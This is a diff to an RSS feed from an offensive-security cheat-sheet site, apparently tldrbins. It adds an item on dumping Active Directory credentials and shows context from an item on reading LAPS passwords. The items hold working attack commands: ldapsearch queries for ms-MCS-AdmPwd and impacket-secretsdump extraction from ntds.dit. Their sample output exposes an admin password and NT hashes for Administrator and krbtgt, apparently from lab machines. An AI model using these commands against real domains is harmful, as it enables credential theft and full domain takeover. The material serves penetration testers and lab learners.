@@ -21,5 +21,12 @@
       <guid>https://tldrbins.github.io/readlapspassword/</guid>
       <description>Abuse #1: Read LAPS Password Linux Windows ldapsearch -H ldap://&amp;lt;TARGET&amp;gt; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -x -D &amp;lt;USER&amp;gt;@&amp;lt;DOMAIN&amp;gt; -w &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;#39;(ms-MCS-AdmPwd=*)&amp;#39; ms-MCS-AdmPwd $ ldapsearch -H ldap://10.10.10.240 -b &amp;#39;DC=LicorDeBellota,DC=HTB&amp;#39; -x -D bob@LicorDeBellota.htb -w &amp;#39;Test1234!@&amp;#39; &amp;#39;(ms-MCS-AdmPwd=*)&amp;#39; ms-MCS-AdmPwd # extended LDIF # # LDAPv3 # base &amp;lt;DC=LicorDeBellota,DC=HTB&amp;gt; with scope subtree # filter: (ms-MCS-AdmPwd=*) # requesting: ms-MCS-AdmPwd # # PIVOTAPI, Domain Controllers, LicorDeBellota.htb dn: CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb ms-Mcs-AdmPwd: 2Vf5kP4Xvj5r605V616x # search reference ref: ldap://ForestDnsZones.LicorDeBellota.htb/DC=ForestDnsZones,DC=LicorDeBell ota,DC=htb # search reference ref: ldap://DomainDnsZones.</description>
     </item>
+    <item>
+      <title>Secrets Dump</title>
+      <link>https://tldrbins.github.io/secretsdump/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/secretsdump/</guid>
+      <description>Convert ntds.dit to .sqlite ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite Ref: ntdsdotsqlite&#xA;With ntds.dit and SYSTEM hive impacket impacket-secretsdump -ntds ntds.dit -system system LOCAL $ impacket-secretsdump -ntds ntds.dit -system system LOCAL Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d::: ---[SNIP]--- [*] Cleaning up.</description>
+    </item>
   </channel>
 </rss>
